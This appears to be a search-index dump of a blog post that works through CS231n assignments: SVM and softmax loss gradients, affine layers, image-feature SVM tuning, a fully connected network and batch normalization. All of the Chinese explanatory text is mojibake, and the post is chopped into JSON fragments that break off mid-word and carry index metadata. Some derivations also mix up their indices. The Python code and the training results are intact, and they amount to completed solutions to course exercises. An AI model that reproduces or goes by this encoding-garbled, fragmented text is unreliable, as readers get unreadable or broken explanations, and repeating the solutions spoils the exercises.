å¦‚æœä»»ä½•ä¸€ä¸ªç±»åˆ«çš„å¾—åˆ†åœ¨çº¢è‰²åŒºåŸŸå†…ï¼ˆæˆ–æ›´é«˜ï¼‰ï¼Œé‚£ä¹ˆå°±ä¼šæœ‰ç´¯è®¡æŸå¤±ã€‚ å¦åˆ™ï¼ŒæŸå¤±ä¸ºé›¶ã€‚ æˆ‘ä»¬çš„ç›®æ ‡æ˜¯ä¸ºè®­ç»ƒæ•°æ®ä¸­çš„æ‰€æœ‰ç¤ºä¾‹æ‰¾åˆ°åŒæ—¶æ»¡è¶³è¿™ä¸€çº¦æŸæ¡ä»¶çš„æƒé‡ï¼Œå¹¶å°½å¯èƒ½é™ä½æ€»æŸå¤±ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜è¦åŠ ä¸Šä¸€ä¸ªæ­£åˆ™åŒ–æŸå¤±ï¼Œä¸€èˆ¬æ˜¯ L2ï¼š $$ R(W) = \\sum_{k}\\sum_{l}W_{k, l} ^ 2 $$ ç„¶åä¹˜ä»¥ä¸€ä¸ªå‚æ•°(å‡½æ•°ä¼ å…¥çš„ reg)ï¼Œæœ€åå’Œå¹³å‡ç´¯è®¡æŸå¤±ç›¸åŠ å¾—åˆ°æœ€ç»ˆæŸå¤±ï¼š $$ L = \\frac{1}{N}\\sum_i L_i + \\lambda R(W) $$ é‚£ä¹ˆæ¢¯åº¦å°±æ˜¯å¯¹æŸå¤±å‡½æ•°å¯¹ W æ±‚å¯¼ï¼Œç¬¬ä¸€éƒ¨åˆ†å¯ä»¥åœ¨ç®—æŸå¤±çš„æ—¶å€™è®¡ç®—å‡ºæ¥ã€‚ def svm_loss_naive(W, X, y, reg): \"\"\" Structured SVM loss function, naive implementation (with loops). Inputs have dimension D, there are C classes, and we operate on minibatches of N examples. Inputs: - W: A numpy array of shape (D, C) containing weights. - X: A numpy array of shape (N, D) containing a minibatch of data. - y: A numpy array of shape (N,) containing training labels; y[i] = c means that X[i] has label c, where 0 \u003c= c \u003c C. - reg: (float) regularization strength Returns a tuple of: - loss as single float - gradient with respect to weights W; an array of same shape as W \"\"\" dW = np.zeros(W.shape) # initialize the gradient as zero # compute the loss and the gradient num_classes = W.shape[1] num_train = X.shape[0] loss = 0.0 for i in range(num_train): scores = X[i].dot(W) correct_class_score = scores[y[i]] for j in range(num_classes): if j == y[i]: continue margin = scores[j] - correct_class_score + 1 # note delta = 1 if margin \u003e 0: loss += margin dW[:, j] += X[i] dW[:, y[i]] -= X[i] # Right now the loss is a sum over all training examples, but we want it # to be an average instead so we divide by num_train. loss /= num_train # Add regularization to the loss. loss += reg * np.sum(W * W) ############################################################################# # TODO: # # Compute the gradient of the loss function and store it dW. # # Rather that first computing the loss and then computing the derivative, # # it may be simpler to compute the derivative at the same time that the # # loss is being computed. As a result you may need to modify some of the # # code above to compute the gradient. # ############################################################################# # *****START OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** dW /= num_train dW += 2 * reg * W # *****END OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** return loss, dW æ£€éªŒä¸€ä¸‹æ¢¯åº¦æ˜¯å¦å¯¹ # Once you've implemented the gradient, recompute it with","date":"2024-12-03","objectID":"/posts/mlcs231n/:2:2","tags":["KNN","ç¥ç»ç½‘ç»œ","SVM"],"title":"CS231n","uri":"/posts/mlcs231n/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Q3: Implement a Softmax classifier SoftMax æŸå¤±å‡½æ•° SoftMax æ˜¯æŠŠå¾—åˆ†è½¬æ¢æˆäº†æ¦‚ç‡ã€‚å…¬å¼å¦‚ä¸‹ï¼š $$ S(y_i) = \\dfrac{e ^ {y_i}}{\\sum\\limits_{j} e ^ {y_j}} $$ æŸå¤±å‡½æ•°å°±æ˜¯æ ¹æ®äº¤å‰ç†µå¥—äº†ä¸ª $-\\log(x)$ï¼š $$ L_i = -\\log\\left(\\dfrac{e ^ {y_i}}{\\sum\\limits_{j} e ^ {y_j}}\\right) $$ SoftMax æ¢¯åº¦æ¨å¯¼ é¦–å…ˆæ ·æœ¬ $i$ çš„å¾—åˆ†ä¸ºï¼š $$ s_i = x_i \\cdot W $$ $s_{i, j}$ è¡¨ç¤ºæ ·æœ¬ $i$ åœ¨ç±»åˆ« $j$ ä¸Šçš„å¾—åˆ†ã€‚ $$ p_i = \\text{softmax}(s_i) = \\dfrac{e ^ {s_i}}{\\sum\\limits_{k} e ^ {s_{i, k}}} $$ $p_{i, j}$ è¡¨ç¤ºæ ·æœ¬ $i$ è¢«é¢„æµ‹ä¸ºç±»åˆ« $j$ çš„æ¦‚ç‡ã€‚ å‡è®¾ä¸€å…±æœ‰ $C$ ç±»ï¼Œ$p_i$ æ˜¯é•¿è¿™æ ·å­çš„ï¼š $$ p_i = \\left[ \\frac{e^{s_{i, 1}}}{\\sum\\limits_{k=1}^{C} e^{s_{i, k}}}, \\frac{e^{s_{i, 2}}}{\\sum\\limits_{k=1}^{C} e^{s_{i, k}}}, \\cdots, \\frac{e^{s_{i, C}}}{\\sum\\limits_{k=1}^{C} e^{s_{i, k}}} \\right] $$ é‚£ä¹ˆå®ƒçš„æŸå¤±å‡½æ•°ä¸ºï¼š $$ L_i = -\\log(p_i) = -\\log\\left(\\dfrac{e ^ {s_i}}{\\sum\\limits_{k} e ^ {s_{i, k}}}\\right) $$ (ä»¥ä¸‹å…¬å¼ä¸ºäº†å½¢å¼ç¾è§‚å°† $s_{i, j}$ ä»¤æˆ $s_j$ï¼Œ$p_{i, j}$ ä»¤æˆ $p_j$ï¼Œæ„æ€æ˜¯éƒ½æ˜¯æ ·æœ¬ $i$ çš„) æŸå¤±å‡½æ•°å¯¹ $W$ æ±‚å¯¼ï¼Œå¹¶ä½¿ç”¨é“¾å¼æ³•åˆ™ï¼š $$ \\dfrac{\\partial L_i}{\\partial W} = \\dfrac{\\partial L_i}{\\partial s_j} \\times \\dfrac{\\partial s_j}{\\partial W} $$ æ˜¾ç„¶æœ‰ $\\dfrac{\\partial s_j}{\\partial W} = x_i$ï¼Œé‡ç‚¹è®¨è®º $\\dfrac{\\partial L_i}{\\partial s_j}$ï¼š $\\frac{\\partial L_i}{\\partial s_j}$ å¯¹äºæ¯ä¸ªç±»åˆ« $j$ï¼š å¦‚æœ $j$ ä¸ºæ­£ç¡®ç±»åˆ« ($y_i = j$)ï¼š $$ \\frac{\\partial L_i}{\\partial s_j} = \\frac{\\partial (-\\log(p_j))}{\\partial s_j} = -\\frac{1}{p_j} \\times \\frac{\\partial p_j}{\\partial s_j} $$ æ¥ä¸‹æ¥ $\\dfrac{\\partial p_j}{\\partial s_j}$ æ˜¯ï¼š $$ \\frac{\\partial p_j}{\\partial s_j} = \\frac{\\partial}{\\partial s_j} \\left( \\frac{e^{s_j}}{\\sum\\limits_{k} e^{s_{j, k}}} \\right) $$ æ±‚å¯¼ï¼š $$ \\frac{\\partial}{\\partial s_j} \\left( \\frac{e^{s_j}}{\\sum\\limits_{k} e^{s_{j, k}}} \\right) = \\frac{e^{s_j} \\sum\\limits_{k} e^{s_{j, k}} - e^{s_j} \\cdot e^{s_j}}{\\left(\\sum\\limits_{k} e^{s_{j, k}}\\right)^2} = \\frac{e^{s_j} \\left(\\sum\\limits_{k} e^{s_{j, k}} - e^{s_j}\\right)}{\\left(\\sum\\limits_{k} e^{s_{j, k}}\\right)^2} = \\dfrac{e ^ {s_j}}{\\sum\\limits_{k} e^{s_{j, k}}} \\times \\left(1 - \\dfrac{e ^ {s_j}}{\\sum\\limits_{k} e^{s_{j, k}}}\\right) = p_j (1 - p_j) $$ äºæ˜¯ $\\dfrac{\\partial L_i}{\\partial s_j} = -\\dfrac{1}{p_j} \\times p_j(1 - p_j) = (p_j - 1)$ åˆ™ $\\dfrac{\\partial L_i}{\\partial W} = (p_j - 1) x_i$ å¦‚æœ $j$ ä¸ºä¸æ­£ç¡®ç±»åˆ« ($y_i \\ne j$)ï¼š $$ \\frac{\\partial L_i}{\\partial s_{y_j}} = \\frac{\\partial (-\\log(p_{y_i}))}{\\partial s_{y_j}} = -\\frac{1}{p_{y_i}} \\times \\frac{\\partial p_{y_i}}{\\partial s_{y_j}} $$ æ¥ä¸‹æ¥ $\\dfrac{\\partial p_{y_j}}{\\partial s_{y_j}}$ æ˜¯ï¼š $$ \\dfrac{\\partial p_{y_j}}{\\partial s_{y_j}} = \\frac{\\partial}{\\partial s_{y_j}} \\left( \\frac{e^{s_j}}{\\sum\\limits_{k} e^{s_{j, k}}} \\right) $$ æ±‚å¯¼ï¼š $$ \\frac{\\partial}{\\partial s_{y_j}} \\left( \\frac{e^{s_j}}{\\sum\\limits_{k} e^{s_{j, k}}} \\right) = -\\frac{e^{s_j} e ^ {s_{y_j}}}{\\left(\\sum\\limits_{k} e^{s_{j, k}}\\right) ^ 2} = -p_j p_{y_j} $$ äºæ˜¯ $\\dfrac{\\partial L_i}{\\partial s_{y_j}} = -\\dfrac{1}{p_{y_i}} \\times \\dfrac{\\partial p_{y_i}}{\\partial s_{y_j}} = p_j$ åˆ™ $\\dfrac{\\partial L_i}{\\partial W} = p_j x_i$ TODO: softmax_loss_naive def softmax_loss_naive(W, X, y, reg): \"\"\" Softmax loss function, naive implementation (with loops) Inputs have dimension D, there are C classes, and we operate on minibatches of N examples. Inputs: - W: A numpy array of shape (D, C) containing weights. - X: A numpy array of shape (N, D) containing a minibatch of data. - y: A numpy array of shape (N,) containing training labels; y[i] = c means that X[i] has label c, where 0 \u003c= c \u003c C. - reg: (float) regularization strength Returns a tuple of: - loss as single float - gradient with respect to weights W; an array of same shape as W \"\"\" # Initialize the loss and gradient to zero. loss = 0.0 dW = np.zeros_like(W) ############################################################################# # TODO: Compute the softmax loss and its gradient using explicit loops. # # Store the loss in loss and the gradient in dW. If you are not careful # # here, it is easy to run into numeric instability. Don't forget the # # regularization! # ############################################################################# # *****START OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** # è·å–æ ·æœ¬æ•°é‡å’Œç±»åˆ«æ•°é‡ num","date":"2024-12-03","objectID":"/posts/mlcs231n/:2:3","tags":["KNN","ç¥ç»ç½‘ç»œ","SVM"],"title":"CS231n","uri":"/posts/mlcs231n/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Q4: Two-Layer Neural Network é¦–å…ˆæ£€éªŒä¸€ä¸‹å‰å‘ä¼ æ’­ï¼Œæ•°æ®ç”Ÿæˆä¸€ä¸ªä¸¤ç»„å¤§å°ä¸º $4 \\times 5 \\times 6$ çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¯´è¾“å…¥å±‚æ˜¯ $120$ ä¸ªèŠ‚ç‚¹ï¼Œç„¶åç›´æ¥è¿æ¥è¾“å‡ºå±‚ï¼Œè®¾è¾“å‡ºå±‚æœ‰ $3$ ä¸ªèŠ‚ç‚¹ã€‚ æ‰€ä»¥è¯´ $w$ å°±æ˜¯ $120 \\times 3$ çš„ï¼Œ$b$ å°±æ˜¯ $3$ çš„ã€‚ # Test the affine_forward function num_inputs = 2 input_shape = (4, 5, 6) output_dim = 3 input_size = num_inputs * np.prod(input_shape) weight_size = output_dim * np.prod(input_shape) x = np.linspace(-0.1, 0.5, num=input_size).reshape(num_inputs, *input_shape) w = np.linspace(-0.2, 0.3, num=weight_size).reshape(np.prod(input_shape), output_dim) b = np.linspace(-0.3, 0.1, num=output_dim) out, _ = affine_forward(x, w, b) correct_out = np.array([[ 1.49834967, 1.70660132, 1.91485297], [ 3.25553199, 3.5141327, 3.77273342]]) # Compare your output with ours. The error should be around e-9 or less. print('Testing affine_forward function:') print('difference: ', rel_error(out, correct_out)) TODO: affine_forward æŠŠ $x$ å‹æˆ $120$ çš„ç¬¬äºŒç»´ã€‚ def affine_forward(x, w, b): \"\"\" Computes the forward pass for an affine (fully-connected) layer. The input x has shape (N, d_1, ..., d_k) and contains a minibatch of N examples, where each example x[i] has shape (d_1, ..., d_k). We will reshape each input into a vector of dimension D = d_1 * ... * d_k, and then transform it to an output vector of dimension M. Inputs: - x: A numpy array containing input data, of shape (N, d_1, ..., d_k) - w: A numpy array of weights, of shape (D, M) - b: A numpy array of biases, of shape (M,) Returns a tuple of: - out: output, of shape (N, M) - cache: (x, w, b) \"\"\" out = None ########################################################################### # TODO: Implement the affine forward pass. Store the result in out. You # # will need to reshape the input into rows. # ########################################################################### # *****START OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** out = x.reshape(x.shape[0], -1).dot(w) + b cache = (x, w, b) # *****END OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** ########################################################################### # END OF YOUR CODE # ########################################################################### cache = (x, w, b) return out, cache æ¥ä¸‹æ¥æ£€éªŒåå‘ä¼ æ’­ã€‚ TODO: affine_backward æˆ‘ä»¬çŸ¥é“è¿™æ˜¯æ‰¹é‡æ¢¯åº¦ä¸‹é™ï¼Œä¹Ÿå°±æ˜¯è¯´è¾“å…¥æ•°æ® $x$ è¢«æˆ‘ä»¬å¤„ç†æˆäº† $n \\times k$ ç»´çš„ï¼Œæ¯ä¸€è¡Œä»£è¡¨ä¸€ä¸ªæ•°æ®ï¼Œåˆ—å°±æ˜¯ç‰¹å¾ã€‚é‚£ä¹ˆè¾“å‡ºå±‚å®šä¹‰ä¸º $n \\times m$ ç»´çš„ï¼Œ$n$ æ˜¯æ•°æ®æ‰¹é‡ä¸ªæ•°ï¼Œ$m$ æ˜¯è¾“å‡ºå±‚èŠ‚ç‚¹ä¸ªæ•°ï¼Œä½†æ˜¯ $w$ å’Œ $b$ åˆ†åˆ«æ˜¯ $k \\times m$ ä¸ $1 \\times m$ ç»´çš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ $n$ ä¸ªæ•°æ®å…±ç”¨ $w$ å’Œ $b$ï¼Œç„¶åæ¯ä¸ªæ•°æ®å¯¹åº”ä¸€ç»„è¾“å‡ºã€‚ é‚£ä¹ˆåœ¨åå‘ä¼ æ’­æ—¶ï¼Œæˆ‘ä»¬éœ€è¦è®¡ç®— $x, w, b$ çš„åå¯¼ï¼Œé¦–å…ˆä»–ç»™äº†ä¸€ä¸ª dout æ•°ç»„ï¼Œè¿™ä»£è¡¨è¾“å‡ºå±‚çš„å¯¼æ•°ï¼Œä»–ä¹Ÿæ˜¯ä¸€ä¸ª $n \\times m$ çš„ã€‚ å•çœ‹ $\\text{out}_{i, j}$ï¼š $$ \\text{out}_{i, j} = \\sum_k x_{i, k} w_{k, j} + b_j $$ $\\text{out}_{i, j}$ å¯¹ $w_{k, j}$ æ±‚åå¯¼ï¼š $$ \\dfrac{\\partial \\text{out}_{i, j}}{\\partial w_{k, j}} = x_{i, k} $$ $\\text{out}_{i, j}$ å¯¹ $x_{i, k}$ æ±‚åå¯¼ï¼š $$ \\dfrac{\\partial \\text{out}_{i, j}}{\\partial x_{i, k}} = w_{k, j} $$ $\\text{out}_{i, j}$ å¯¹ $b_j$ æ±‚åå¯¼ï¼š $$ \\dfrac{\\partial \\text{out}_{i, j}}{\\partial b_j} = 1 $$ é‚£ä¹ˆæŸå¤±å‡½æ•° $L$ å¯¹ $w_{k, j}$ æ±‚åå¯¼ï¼Œæ ¹æ®é“¾å¼æ³•åˆ™æœ‰ï¼š $$ \\dfrac{\\partial L}{\\partial w_{k, j}} = \\sum_i \\dfrac{\\partial L}{\\partial \\text{out}_{i, j}} \\dfrac{\\partial \\text{out}_{i, j}}{\\partial w_{k, j}} $$ å…¶ä¸­ $\\dfrac{\\partial L}{\\partial \\text{out}_{i, j}}$ è¿™ä¸ªä¸œè¥¿å°±æ˜¯ dout[i, j] (ä¸Šæ¸¸ä¼ æ¥çš„å¯¼æ•°)ï¼Œè€Œ $\\dfrac{\\partial \\text{out}_{i, j}}{\\partial w_{k, j}} = x_{i, k}$ï¼Œæ‰€ä»¥ $$ \\dfrac{\\partial L}{\\partial w_{k, j}} = \\sum_i \\text{dout}_{i, j}x_{i, k} $$ å†æ¥çœ‹æŸå¤±å‡½æ•° $L_i$ å¯¹ $x_{i, k}$ æ±‚åå¯¼ï¼Œæ ¹æ®é“¾å¼æ³•åˆ™æœ‰ï¼š $$ \\dfrac{\\partial L}{\\partial x_{i, k}} = \\sum_j \\dfrac{\\partial L}{\\partial \\text{out}_{i, j}} \\dfrac{\\partial \\text{out}_{i, j}}{\\partial x_{i, k}} $$ ç»§ç»­å¸¦å…¥ $\\dfrac{\\partial L}{\\partial \\text{out}_{i, j}} = \\text{dout}_{i, j}$ï¼Œ$\\dfrac{\\partial \\text{out}_{i, j}}{\\partial x_{i, k}} = w_{k, j}$ï¼š $$ \\dfrac{\\partial L}{\\partial x_{i, k}} = \\sum_j \\text{dout}_{i, j}w_{k, j} $$ ç»§ç»­çœ‹æŸå¤±å‡½æ•° $L_i$ å¯¹ $b_{j}$ æ±‚åå¯¼ï¼Œæ ¹æ®é“¾å¼æ³•åˆ™æœ‰ï¼š $$ \\dfrac{\\partial L}{\\partial b_{j}} = \\sum_i \\dfrac{\\partial L}{\\partial \\text{out}_{i, j}} \\dfrac{\\partial \\text{out}_{i, j}}{\\partial b_{j}} $$ è¿˜æ˜¯ç»§ç»­å¸¦å…¥ $\\dfrac{\\partial L}{\\partial \\text{out}_{i, j}} = \\text{dout}_{i, j}$ï¼Œ$\\dfrac{\\p","date":"2024-12-03","objectID":"/posts/mlcs231n/:2:4","tags":["KNN","ç¥ç»ç½‘ç»œ","SVM"],"title":"CS231n","uri":"/posts/mlcs231n/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Q5: Higher Level Representations: Image Features ä½¿ç”¨ HOG å’Œ color histogram ç‰¹å¾æå–ä¸€ä¸‹å›¾åƒçš„ä¿¡æ¯ï¼Œç®€å•æ¥è¯´å°±æ˜¯å°†å›¾ç‰‡çš„ç‰¹å¾è¡¨ç°å¾—æ›´æ˜æ˜¾ã€‚ from cs231n.features import * num_color_bins = 10 # Number of bins in the color histogram feature_fns = [hog_feature, lambda img: color_histogram_hsv(img, nbin=num_color_bins)] X_train_feats = extract_features(X_train, feature_fns, verbose=True) X_val_feats = extract_features(X_val, feature_fns) X_test_feats = extract_features(X_test, feature_fns) # Preprocessing: Subtract the mean feature mean_feat = np.mean(X_train_feats, axis=0, keepdims=True) X_train_feats -= mean_feat X_val_feats -= mean_feat X_test_feats -= mean_feat # Preprocessing: Divide by standard deviation. This ensures that each feature # has roughly the same scale. std_feat = np.std(X_train_feats, axis=0, keepdims=True) X_train_feats /= std_feat X_val_feats /= std_feat X_test_feats /= std_feat # Preprocessing: Add a bias dimension X_train_feats = np.hstack([X_train_feats, np.ones((X_train_feats.shape[0], 1))]) X_val_feats = np.hstack([X_val_feats, np.ones((X_val_feats.shape[0], 1))]) X_test_feats = np.hstack([X_test_feats, np.ones((X_test_feats.shape[0], 1))]) TODO: Train SVM on features ç”¨æ–°æ•°æ®è®­ç»ƒï¼Œä»£ç å’Œä¹‹å‰å·®ä¸å¤š # Use the validation set to tune the learning rate and regularization strength from cs231n.classifiers.linear_classifier import LinearSVM learning_rates = [1e-9, 1e-8, 1e-7] regularization_strengths = [5e4, 5e5, 5e6] results = {} best_val = -1 best_svm = None ################################################################################ # TODO: # # Use the validation set to set the learning rate and regularization strength. # # This should be identical to the validation that you did for the SVM; save # # the best trained classifer in best_svm. You might also want to play # # with different numbers of bins in the color histogram. If you are careful # # you should be able to get accuracy of near 0.44 on the validation set. # ################################################################################ # *****START OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** for lr in learning_rates: for reg in regularization_strengths: svm = LinearSVM() svm.train(X_train_feats, y_train, learning_rate=lr, reg=reg, num_iters=2000, verbose=False) y_train_pred = svm.predict(X_train_feats) train_accuracy = np.mean(y_train == y_train_pred) y_val_pred = svm.predict(X_val_feats) val_accuracy = np.mean(y_val == y_val_pred) results[(lr, reg)] = (train_accuracy, val_accuracy) if val_accuracy \u003e best_val: best_val = val_accuracy best_svm = svm # *****END OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** # Print out results. for lr, reg in sorted(results): train_accuracy, val_accuracy = results[(lr, reg)] print('lr %e reg %e train accuracy: %f val accuracy: %f' % ( lr, reg, train_accuracy, val_accuracy)) print('best validation accuracy achieved: %f' % best_val) lr 1.000000e-09 reg 5.000000e+04 train accuracy: 0.099714 val accuracy: 0.093000 lr 1.000000e-09 reg 5.000000e+05 train accuracy: 0.093898 val accuracy: 0.078000 lr 1.000000e-09 reg 5.000000e+06 train accuracy: 0.414571 val accuracy: 0.413000 lr 1.000000e-08 reg 5.000000e+04 train accuracy: 0.092082 val accuracy: 0.077000 lr 1.000000e-08 reg 5.000000e+05 train accuracy: 0.413224 val accuracy: 0.422000 lr 1.000000e-08 reg 5.000000e+06 train accuracy: 0.409714 val accuracy: 0.393000 lr 1.000000e-07 reg 5.000000e+04 train accuracy: 0.417327 val accuracy: 0.421000 lr 1.000000e-07 reg 5.000000e+05 train accuracy: 0.407857 val accuracy: 0.396000 lr 1.000000e-07 reg 5.000000e+06 train accuracy: 0.321898 val accuracy: 0.309000 best validation accuracy achieved: 0.422000 # Evaluate your trained SVM on the test set: you should be able to get at least 0.40 y_test_pred = best_svm.predict(X_test_feats) test_accuracy = np.mean(y_test == y_test_pred) print(test_accuracy) 0.424 Inline question 1: Describe the misclassification results that you see. Do they make sense? ${\\textit Your Answer:}$ å¯ä»¥ç†è§£ï¼Œå› ä¸ºæœ‰äº›å¤ªç›¸ä¼¼äº†ã€‚ TODO: Neural Network on image f","date":"2024-12-03","objectID":"/posts/mlcs231n/:2:5","tags":["KNN","ç¥ç»ç½‘ç»œ","SVM"],"title":"CS231n","uri":"/posts/mlcs231n/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Assignment 2 ","date":"2024-12-03","objectID":"/posts/mlcs231n/:3:0","tags":["KNN","ç¥ç»ç½‘ç»œ","SVM"],"title":"CS231n","uri":"/posts/mlcs231n/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Q1: Multi-Layer Fully Connected Neural Networks TODO: fc_net __init__ å…ˆè§£é‡Šä¸€ä¸‹ __init__ çš„å‚æ•°ã€‚ å‚æ•°ç¿»è¯‘ï¼š hidden_dims: ä¸€ä¸ªæ•´æ•°åˆ—è¡¨ï¼ŒæŒ‡å®šæ¯ä¸ªéšè—å±‚çš„å¤§å°ï¼ˆç¥ç»å…ƒæ•°é‡ï¼‰ input_dim: ä¸€ä¸ªæ•´æ•°ï¼ŒæŒ‡å®šè¾“å…¥å±‚çš„ç»´åº¦å¤§å°ï¼ˆé»˜è®¤å€¼ä¸º3x32x32ï¼Œé€‚ç”¨äº32x32çš„RGBå›¾åƒï¼‰ num_classes: ä¸€ä¸ªæ•´æ•°ï¼ŒæŒ‡å®šéœ€è¦åˆ†ç±»çš„ç±»åˆ«æ•°é‡ï¼ˆé»˜è®¤ä¸º10ç±»ï¼‰ dropout_keep_ratio: ä¸¢å¼ƒå¼ºåº¦ï¼Œä¸€ä¸ª0åˆ°1ä¹‹é—´çš„æ ‡é‡ï¼Œè¡¨ç¤ºdropoutä¿ç•™ç¥ç»å…ƒçš„æ¯”ä¾‹ã€‚å¦‚æœç­‰äº1åˆ™è¡¨ç¤ºä¸ä½¿ç”¨dropout normalization: æŒ‡å®šç½‘ç»œä½¿ç”¨çš„å½’ä¸€åŒ–ç±»å‹ï¼Œå¯é€‰å€¼åŒ…æ‹¬ï¼š batchnorm: æ‰¹é‡å½’ä¸€åŒ– layernorm: å±‚å½’ä¸€åŒ– None: ä¸ä½¿ç”¨å½’ä¸€åŒ–ï¼ˆé»˜è®¤å€¼ï¼‰ reg: ä¸€ä¸ªæ ‡é‡ï¼Œè¡¨ç¤ºL2æ­£åˆ™åŒ–çš„å¼ºåº¦ weight_scale: ä¸€ä¸ªæ ‡é‡ï¼Œè¡¨ç¤ºæƒé‡åˆå§‹åŒ–æ—¶ä½¿ç”¨çš„æ­£æ€åˆ†å¸ƒæ ‡å‡†å·® dtype: numpyæ•°æ®ç±»å‹å¯¹è±¡ã€‚æ‰€æœ‰è®¡ç®—éƒ½å°†ä½¿ç”¨æ­¤æ•°æ®ç±»å‹ï¼š float32: è¿ç®—æ›´å¿«ä½†ç²¾åº¦è¾ƒä½ float64: é€‚ç”¨äºæ•°å€¼æ¢¯åº¦æ£€æŸ¥ï¼Œç²¾åº¦æ›´é«˜ seed: éšæœºç§å­ã€‚å¦‚æœä¸ä¸ºNoneï¼Œåˆ™ä¼ é€’ç»™dropoutå±‚ä½¿å…¶å…·æœ‰ç¡®å®šæ€§ï¼Œä¾¿äºè¿›è¡Œæ¢¯åº¦æ£€æŸ¥ ç„¶åå¼€å§‹åˆå§‹åŒ–å‚æ•°ï¼Œ # è·å–æ‰€æœ‰å±‚çš„ç»´åº¦ dims = [input_dim] + hidden_dims + [num_classes] # åˆå§‹åŒ–æ¯ä¸€å±‚çš„å‚æ•° for i in range(self.num_layers): # åˆå§‹åŒ–æƒé‡çŸ©é˜µ,ä½¿ç”¨æ­£æ€åˆ†å¸ƒ self.params['W' + str(i + 1)] = weight_scale * np.random.randn(dims[i], dims[i + 1]) # åˆå§‹åŒ–åç½®å‘é‡ä¸º0 self.params['b' + str(i + 1)] = np.zeros(dims[i + 1]) # å¦‚æœä½¿ç”¨æ‰¹å½’ä¸€åŒ–ä¸”ä¸æ˜¯æœ€åä¸€å±‚ï¼Œæœ€åä¸€å±‚ä¸éœ€è¦æ­£åˆ™åŒ–å‚æ•° if self.normalization and i \u003c self.num_layers - 1: # gammaåˆå§‹åŒ–ä¸º1 self.params['gamma' + str(i + 1)] = np.ones(dims[i + 1]) # betaåˆå§‹åŒ–ä¸º0 self.params['beta' + str(i + 1)] = np.zeros(dims[i + 1]) æ³¨æ„æœ€åä¸€å±‚ä¸éœ€è¦æ­£åˆ™åŒ–å‚æ•°ï¼Œå› ä¸ºæ¨¡å‹é‡Œæœ€åä¸€å±‚æ˜¯ softmaxï¼Œæœ¬èº«å°±ä¼šå½’ä¸€åŒ–åˆ° $0 \\sim 1$ loss æŠŠ assignment1 çš„ layers.py å…ˆæŠ„è¿‡æ¥ï¼Œç„¶åå†™ä¸€ä¸‹å‰å‘ä¼ æ’­å’Œåå‘ä¼ æ’­ã€‚ def loss(self, X, y=None): \"\"\"Compute loss and gradient for the fully connected net. Inputs: - X: Array of input data of shape (N, d_1, ..., d_k) - y: Array of labels, of shape (N,). y[i] gives the label for X[i]. Returns: If y is None, then run a test-time forward pass of the model and return: - scores: Array of shape (N, C) giving classification scores, where scores[i, c] is the classification score for X[i] and class c. If y is not None, then run a training-time forward and backward pass and return a tuple of: - loss: Scalar value giving the loss - grads: Dictionary with the same keys as self.params, mapping parameter names to gradients of the loss with respect to those parameters. \"\"\" X = X.astype(self.dtype) mode = \"test\" if y is None else \"train\" # Set train/test mode for batchnorm params and dropout param since they # behave differently during training and testing. if self.use_dropout: self.dropout_param[\"mode\"] = mode if self.normalization == \"batchnorm\": for bn_param in self.bn_params: bn_param[\"mode\"] = mode scores = None ############################################################################ # TODO: Implement the forward pass for the fully connected net, computing # # the class scores for X and storing them in the scores variable. # # # # When using dropout, you'll need to pass self.dropout_param to each # # dropout forward pass. # # # # When using batch normalization, you'll need to pass self.bn_params[0] to # # the forward pass for the first batch normalization layer, pass # # self.bn_params[1] to the forward pass for the second batch normalization # # layer, etc. # ############################################################################ # *****START OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** # ç”¨ä¸€ä¸ªå˜é‡ä¿å­˜ä¸Šä¸€å±‚çš„è¾“å‡º layer_input = X caches = {} # å¯¹å‰é¢ L - 1 å±‚è¿›è¡Œæ“ä½œï¼Œå› ä¸ºæœ€åä¸€å±‚çš„æ“ä½œå’Œå‰é¢çš„ä¸ä¸€æ · for i in range(1, self.num_layers): W = self.params['W' + str(i)] b = self.params['b' + str(i)] # è®¡ç®—affineå±‚çš„è¾“å‡º affine_out, affine_cache = affine_forward(layer_input, W, b) # è®¡ç®—reluå±‚çš„è¾“å‡º relu_out, relu_cache = relu_forward(affine_out) # ä¿å­˜cache caches['affine_cache' + str(i)] = affine_cache caches['relu_cache' + str(i)] = relu_cache # æ›´æ–°layer_input layer_input = relu_out # æœ€åä¸€å±‚çš„æ“ä½œ W = self.params['W' + str(self.num_layers)] b = self.params['b' + str(self.num_layers)] scores, affine_cache = affine_forward(layer_input, W, b) caches['affine_cache' + str(self.num_layers)] = affine_cache # *****END OF YOUR CODE (DO NOT DELETE/MODIFY THIS LINE)***** ############################################################################ # END OF YOUR CODE # ############################################################################ # If test mode return early. if mode == \"test\": return scores loss, grads = 0.0, {} ############################################################################ #","date":"2024-12-03","objectID":"/posts/mlcs231n/:3:1","tags":["KNN","ç¥ç»ç½‘ç»œ","SVM"],"title":"CS231n","uri":"/posts/mlcs231n/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Q2: Batch Normalization å‚è€ƒè®ºæ–‡ æ ¸å¿ƒå…¬å¼ï¼š TODO: batchnorm_forward def batchnorm_forward(x, gamma, beta, bn_param): \"\"\" Forward pass for batch normalization. During training the sample mean and (uncorrected) sample variance are computed from minibatch statistics and used to normalize the incoming data. During training we also keep an exponentially decaying running mean of the mean and variance of each feature, and these averages are used to normalize data at test-time. At each timestep we update the running averages for mean and variance using an exponential decay based on the momentum parameter: running_mean = momentum * running_mean + (1 - momentum) * sample_mean running_var = momentum * running_var + (1 - momentum) * sample_var Note that the batch normalization paper suggests a different test-time behavior: they compute sample mean and variance for each feature using a large number of training images rather than using a running average. For this implementation we have chosen to use running averages instead since they do not require an additional estimation step; the torch7 implementation of batch normalization also uses running averages. Input: - x: Data of shape (N, D) - gamma: Scale parameter of shape (D,) - beta: Shift paremeter of shape (D,) - bn_param: 